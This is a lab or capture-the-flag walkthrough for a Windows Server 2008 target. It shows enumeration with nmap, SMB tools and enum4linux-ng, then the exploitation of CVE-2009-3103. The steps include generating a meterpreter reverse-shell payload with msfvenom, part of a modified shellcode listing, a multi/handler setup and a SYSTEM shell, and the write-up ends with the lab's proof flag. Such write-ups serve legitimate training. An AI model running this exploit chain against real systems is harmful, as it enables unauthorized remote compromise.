# Internal

## Initial access

Ran `autorecon` to enumerate the target:

```
sudo autorecon 192.168.239.40
```

Open ports discovered:

- **53 (TCP + UDP)** — DNS (Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1))
- **135** — MSRPC (Microsoft Windows RPC)
- **137 (UDP)** — NetBIOS (workgroup: WORKGROUP)
- **139** — NetBIOS (Windows Server (R) 2008 Standard 6001 Service Pack 1 netbios-ssn)
  - autorecon detected `smb-vuln-ms17-010` (CVE-2017-0143), risk factor HIGH. This was not confirmed in the follow-up nmap scan.
- **445** — SMB (Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds, workgroup: WORKGROUP)
  - autorecon detected `smb-vuln-ms17-010` (CVE-2017-0143), risk factor HIGH. This was not confirmed in the follow-up nmap scan.
- **3389** — RDP (Microsoft Terminal Service)
- **5357** — HTTP (Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP))
- **49152–49158** — MSRPC

A follow-up `nmap` scan with service version detection and TCP connect scan confirmed the open ports and refined the version information:

```
nmap -sVC -p- -v -T4 -sT --open 192.168.239.40
...
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| rdp-ntlm-info: 
|   Target_Name: INTERNAL
|   NetBIOS_Domain_Name: INTERNAL
|   NetBIOS_Computer_Name: INTERNAL
|   DNS_Domain_Name: internal
|   DNS_Computer_Name: internal
|   Product_Version: 6.0.6001
|_  System_Time: 2026-11-24T13:55:58+00:00
| ssl-cert: Subject: commonName=internal
| Issuer: commonName=internal
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2025-01-05T19:52:51
| Not valid after:  2025-07-07T19:52:51
| MD5:     7c2b 85a9 1fe2 c264 4be8 ed3e e16b 274a
| SHA-1:   05e9 c5e9 7ac6 242e 0a18 ca56 e1b5 1c38 31db d393
|_SHA-256: e7c6 7c33 ae2d 5b01 281e 5531 3875 2a7e 0a4f bdbd e844 b3bb 7cca 246e 8ac2 5dfc
|_ssl-date: 2026-11-24T13:56:06+00:00; 0s from scanner time.
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2
```

Key findings from the nmap scan:

- Ports **49152–49158** — MSRPC
- The `rdp-ntlm-info` scan revealed the target name, NetBIOS domain, and DNS domain as `internal`.

SMB enumeration was performed to check for anonymous access and share enumeration:

```
smbclient -L //192.168.239.40/ -N 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.239.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

netexec smb 192.168.239.40 -u any -p '' --shares
SMB         192.168.239.40  445    INTERNAL         [*] Windows Server (R) 2008 Standard 6001 Service Pack 1 x32 (name:INTERNAL) (domain:internal) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         192.168.239.40  445    INTERNAL         [-] internal\any: STATUS_LOGON_FAILURE

nxc smb 192.168.239.40 -u '' -p '' -M spider_plus
SMB         192.168.239.40  445    INTERNAL         [*] Windows Server (R) 2008 Standard 6001 Service Pack 1 x32 (name:INTERNAL) (domain:internal) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         192.168.239.40  445    INTERNAL         [+] internal\: 
SPIDER_PLUS 192.168.239.40  445    INTERNAL         [+] saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/192.168.239.40.json".
SPIDER_PLUS 192.168.239.40  445    INTERNAL         [*] Total folders found:  0
SPIDER_PLUS 192.168.239.40  445    INTERNAL         [*] Total files found:    0

nmap --script smb-enum-shares,smb-enum-users -p 139,445 192.168.239.40
...
\\192.168.239.40\ADMIN$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
...
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
\\192.168.239.40\IPC$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: READ
...
\\192.168.239.40\PUBLIC: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>

enum4linux-ng 192.168.239.40 -A -Gm -R -t 15
...
[+] Full NetBIOS names information:
- INTERNAL        <00> -         B <ACTIVE>  Workstation Service
- WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
- INTERNAL        <20> -         B <ACTIVE>  File Server Service
- MAC Address = 00-50-56-AB-C8-71
...
[+] Found domain information via SMB
NetBIOS computer name: INTERNAL
NetBIOS domain name: ''
DNS domain: internal
FQDN: internal
Derived membership: workgroup member
Derived domain: unknown
...
[*] Check for anonymous access (null session)
[+] Server allows authentication via username '' and password ''
[*] Check for guest access
[-] Could not establish guest session: STATUS_LOGON_FAILURE
...
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows Server (R) 2008 Standard 6001 Service Pack 1
OS version: '6.0'
OS release: ''
OS build: '6001'
Native OS: Windows Server (R) 2008 Standard 6001 Service Pack 1
Native LAN manager: Windows Server (R) 2008 Standard 6.0
...
[+] Found 0 share(s) for user '' with password '', try a different user
```

- No interesting findings from SMB enumeration.

Port **5357** (WSDAPI / Web Services for Devices) was investigated online — [Port 5357 / WSDAPI Web Services for Devices](https://www.pentestpad.com/port-exploit/port-5357-wsdapi-web-services-for-devices). It is associated with CVE-2009-2512, but the target runs Windows Server 2008 SP1 (not Gold/SP2) and no working exploits were found for this specific version.

Returned to SMB vulnerability scanning. The initial `autorecon` scan had filtered out certain vulnerability checks:

```
nmap --script smb-vuln* -p 139,445 192.168.239.40                     
...
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: SMB: Failed to connect to host: TIMEOUT
|_smb-vuln-ms10-054: false
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|     Risk factor: HIGH
|       Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|       Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|       denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|       PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|       aka "SMBv2 Negotiation Vulnerability."
|       
|     Disclosure date: 2009-09-08
|     References:
|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
```

The `autorecon` scan ran `nmap --script "smb-vuln-* and dos" -p 139,445 192.168.239.40`, which filtered out this vulnerability because the nmap script tag includes `dos`.

CVE-2009-3103 is a critical Remote Code Execution (RCE) vulnerability in the Microsoft Windows `srv2.sys` driver (SMBv2 protocol implementation), patched under Microsoft Security Bulletin **MS09-050**. Confirmed exploits include:

- **Exploit-DB 40280** (Python) — Injects a payload to target port 445 via a socket and triggers execution through an authentication event using `rpcclient`.
- **Exploit-DB 14674** (C / Binary) — Exploits the `ProcessID` function table dereference on Windows Vista (SP1/SP2) to bind a shell on port `28876` with `NT AUTHORITY\SYSTEM` privileges.

Downloaded the Exploit-DB 40280 script and modified it:

```
searchsploit -m 40289
```

A new reverse shell payload was generated via `msfvenom`:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.208 LPORT=443 EXITFUNC=thread -f python
```

The key modifications compared the original Python payload to a new one generated for this target:

```
25,52c25,57
< shell += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"   #fce8820000006089e531c0648b
< shell += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
...
< shell += "\x53\xff\xd5"
---
> shell += "\xfc\xe8\x90\x00\x00\x00\x60\x89\xe5\x31\xd2\x64"
> shell += "\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a"
...
> shell += "\x53\xff\xd5"
```

Python 2 setup was required:

```
curl -sS https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
python2 get-pip.py --user "setuptools<45" "wheel<0.38"
python2 -m pip install --user pysmb
```

The initial exploit attempt produced a connection but yielded an invalid shell:

```
python2 40280_modified.py 192.168.239.40
Password for [WORKGROUP\Administrator]:
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE

# penelope
[-] Invalid shell from 192.168.239.40 🙄
```

Switched to catching a `meterpreter` reverse shell instead. Set up a listener in `msfconsole`:

```
msfconsole
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.45.208
msf exploit(multi/handler) > set LPORT 443
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.45.208:443
[*] Sending stage (203453 bytes) to 192.168.239.40
[*] Meterpreter session 1 opened (192.168.45.208:443 -> 192.168.239.40:49159) at 2026-11-24 19:14:57 -0500

meterpreter > shell

C:\Windows\system32>whoami
nt authority\system
```

Retrieved the `proof.txt` flag:

```
C:\Windows\system32>type C:\Users\Administrator\Desktop\proof.txt
5166fc0c80c5bc64d0e62c76d632cd1a
```

No privilege escalation was required — the CVE-2009-3103 exploit yielded a direct `nt authority\system` shell.
